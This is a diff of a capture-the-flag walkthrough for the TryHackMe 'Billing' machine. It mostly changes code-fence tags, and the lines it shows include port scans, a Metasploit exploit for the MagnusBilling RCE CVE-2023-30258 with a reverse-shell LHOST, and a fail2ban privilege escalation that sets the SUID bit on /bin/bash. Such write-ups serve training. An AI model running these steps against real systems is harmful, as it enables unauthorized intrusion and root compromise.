@@ -11,7 +11,7 @@ This Write-up/Walkthrough provides my process for the **Billing** *(THM)* CTF. H
 
 I started doing the respective fast scan to the IP to obtain only open ports:
 
-```bash
+```
 nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 10.112.189.167
 
   22/tcp   open  ssh     syn-ack ttl 62
@@ -21,7 +21,7 @@ nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 10.112.189.167
 
 Once the ports are found, let's made an exhaustive scan:
 
-```bash
+```
 nmap -p22,80,5038 -sV -sC 10.112.189.167
 
   22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
@@ -50,9 +50,8 @@ I found 3 ports opened:
 
 Usually, I start doing a website passive recognition:
 
-```bash
+```
 whatweb 10.112.189.167
-
   ERROR Opening: https://10.112.189.167 - Connection refused - connect(2) for "10.112.189.167" port 443
   http://10.112.189.167 [302 Found] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.112.189.167], RedirectLocation[./mbilling]
   http://10.112.189.167/mbilling [301 Moved Permanently] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.112.189.167], RedirectLocatI fion[http://10.112.189.167/mbilling/], Title[301 Moved Permanently]
@@ -64,7 +63,7 @@ We know Apache 2.4.62 is running on port 80, let's take a look of the website:
 
 It is a login form, I have not the credentials. Let's check the routes:
 
-```bash
+```
 gobuster dir -u http://billing.thm/mbilling -w /usr/share/wordlists/dirb/common.txt -t 100 -q
 
   .hta                 (Status: 403) [Size: 276]
@@ -121,7 +120,7 @@ The **CVE-2023-30258** is the key
 
   2. I took that exploit (same name that CVE found):
 
-  ```bash
+  ```
   msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS 10.112.159.56
   RHOSTS => 10.112.159.56
   msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 192.168.136.26
@@ -164,7 +163,7 @@ The **CVE-2023-30258** is the key
 
   First Flag:
 
-  ```bash
+  ```
   ls -la /home/magnus
   total 76
   drwxr-xr-x 15 magnus magnus 4096 Sep  9  2024 .
@@ -197,7 +196,7 @@ The **CVE-2023-30258** is the key
 
 Now that we have the first flag, let's escalate privileges:
 
-```bash
+```
 sudo -l
 
 Matching Defaults entries for asterisk on ip-10-114-188-168:
@@ -221,7 +220,7 @@ https://juggernaut-sec.com/fail2ban-lpe/#Exploiting_Fail2Ban_and_Getting_a_Root_
 
 I assume we must find a way to edit the banned file for Asterisk:
 
-```bash
+```
 cd /etc/fail2ban
 ```
 
@@ -231,30 +230,30 @@ cd /etc/fail2ban
 
 I ran:
 
-```bash
+```
 sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
 ```
 
 We need to ban an IP (I banned google), this way, we ensure that the service runs and applies our new settings:
 
-```bash
+```
 sudo /usr/bin/fail2ban-client set asterisk-iptables banip 8.8.8.8
 ```
 
 Finally:
 
-```bash
-/bin/bash → # We remain as "asterisk"
+```
+/bin/bash # We remain as "asterisk"
 ```
 
 But if we use:
 
-```bash
+```
 /bin/bash -p
 ```
 Voilà ! We are root, from here we can run:
 
-```bash
+```
 cat /root/root.txt
 ```
 
